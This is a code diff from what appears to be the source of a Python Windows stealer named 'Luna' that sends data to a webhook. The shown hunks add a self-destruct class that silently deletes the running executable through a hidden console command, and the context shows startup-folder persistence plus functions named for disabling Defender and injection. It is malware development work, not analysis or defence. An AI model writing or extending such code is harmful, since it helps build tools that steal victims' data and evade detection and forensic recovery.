@@ -106,7 +106,7 @@ def Luna(webhook: str):
         proc(webhook)
 
     if __CONFIG__["self_destruct"]:
-        self_destruct()
+        SelfDestruct()
 
 
 def configcheck(list):
@@ -136,11 +136,6 @@ def startup():
     if os.path.exists(target_path):
         os.remove(target_path)
     subprocess.run(["copy", __file__, startup_path], shell=True, check=True)
-
-
-def self_destruct():
-    with open(f"{temp}/main.py", 'w') as file:
-        file.write("import os\nos.remove(__file__)")
 
 
 def disable_defender():
@@ -791,6 +786,25 @@ class AntiSpam:
             with open(f"{temp}\\dd_setup.txt", "w") as g:
                 g.write(str(current_time))
             return False
+
+
+class SelfDestruct():
+    def __init__(self):
+        self.path, self.frozen = self.getfile()
+        self.delete()
+
+    def getfile(self):
+        if hasattr(sys, 'frozen'):
+            return (sys.executable, True)
+        else:
+            return (__file__, False)
+
+    def delete(self):
+        if self.frozen:
+            subprocess.Popen('ping localhost -n 3 > NUL && del /F "{}"'.format(self.path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+            os._exit(0)
+        else:
+            os.remove(self.path)
 
 
 class Injection:
